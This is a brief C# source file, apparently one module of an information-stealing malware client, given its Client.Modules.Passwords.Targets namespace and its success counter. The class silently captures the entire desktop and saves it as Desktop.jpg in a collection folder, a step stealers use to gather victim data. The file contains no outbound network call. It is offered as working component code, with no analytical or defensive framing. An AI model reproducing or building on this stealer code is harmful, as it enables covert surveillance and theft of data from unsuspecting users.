using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.System;

internal sealed class DesktopScreenshot
{
	public static bool Make(string sSavePath)
	{
		try
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
				}
				bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
			}
			Counter.DesktopScreenshot = true;
			return true;
		}
		catch
		{
			return false;
		}
	}
}
